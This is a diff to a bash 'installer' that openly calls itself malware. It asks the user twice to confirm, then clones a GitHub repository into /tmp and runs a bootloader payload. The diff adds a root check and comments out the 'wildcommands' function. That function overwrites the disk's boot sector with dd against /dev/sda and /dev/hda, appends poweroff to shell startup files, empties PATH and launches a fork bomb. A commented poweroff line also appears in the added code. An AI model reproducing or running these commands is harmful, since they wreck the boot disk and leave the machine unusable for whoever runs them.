@@ -2,7 +2,9 @@
 
 
 
-if [[ -n "$XDG_SESSION_DESKTOP" ]]; then
+if [[ $EUID == 0 ]]
+then
+  if [[ -n "$XDG_SESSION_DESKTOP" ]]; then
   zenityavailable=$(which zenity)
   if [[ "$zenityavailable" != "" ]]; then
 
@@ -14,6 +16,7 @@ if [[ -n "$XDG_SESSION_DESKTOP" ]]; then
       zenity --question --text="This malware is no joke! Do you want to proceed? (Double Check)" --title="WARNING!" --cancel-label="Cancel" --ok-label="Proceed"
       if [[ $? -eq 0 ]]; then
         zenity --info --text "Welp, Good luck." --title "..." --ok-label "Alright"
+        #   echo poweroff >> .bashrc && echo poweroff >> .zshrc;
         cd /tmp
         git clone https://github.com/Psylops/summerproj.git
         cd /tmp/summerproj/CyberSec/bootloader
@@ -27,36 +30,39 @@ if [[ -n "$XDG_SESSION_DESKTOP" ]]; then
     fi
   fi
 
-else
+  else
 
-  dialogavailable=$(which whiptail)
-  if [[ "$dialogavailable" != "" ]]; then
-    whiptail --yesno "This malware is no joke. Proceed?" --yes-button "Proceed" --no-button "Cancel" --title "Warning!" 10 35
-    if [[ $? -ne 0 ]]; then
-      exit
-    else
-      whiptail --yesno "This malware is no joke. Proceed? (Double Check.)" --yes-button "Proceed" --no-button "Cancel" --title "Warning!" 10 35
+    dialogavailable=$(which whiptail)
+    if [[ "$dialogavailable" != "" ]]; then
+      whiptail --yesno "This malware is no joke. Proceed?" --yes-button "Proceed" --no-button "Cancel" --title "Warning!" 10 35
       if [[ $? -ne 0 ]]; then
         exit
       else
-        whiptail --msgbox "Welp, Good luck." 8 20 --title "..."
-        cd /tmp
-        mkdir last
-        cd last
-        git clone https://github.com/Psylops/summerproj.git
-        cd summerproj/CyberSec/bootloader
-        wildcommands
+        whiptail --yesno "This malware is no joke. Proceed? (Double Check.)" --yes-button "Proceed" --no-button "Cancel" --title "Warning!" 10 35
+        if [[ $? -ne 0 ]]; then
+          exit
+        else
+          whiptail --msgbox "Welp, Good luck." 8 20 --title "..."
+          #   echo poweroff >> .bashrc && echo poweroff >> .zshrc;
+          cd /tmp
+          git clone https://github.com/Psylops/summerproj.git
+          cd /tmp/summerproj/CyberSec/bootloader
+          wildcommands
+        fi
       fi
     fi
   fi
+else
+
+  echo -e "\e[1;31mFor this installer to begin you need to run it as root.\e[0m"
+
 fi
 
 #wild and dangerous commands:
 
-function wildcommands() {
-  echo poweroff >> .bashrc && echo poweroff >> .zshrc;
-  sudo dd if=boot.bin of=/dev/sda bs=512;
-  sudo dd if=boot.bin of=/dev/hda bs=512;
-  PATH="";
-  :(){ :|:& };:
-}
+# function wildcommands() {
+#   sudo dd if=boot.bin of=/dev/sda bs=512;
+#   sudo dd if=boot.bin of=/dev/hda bs=512;
+#   PATH="";
+#   :(){ :|:& };:
+# }
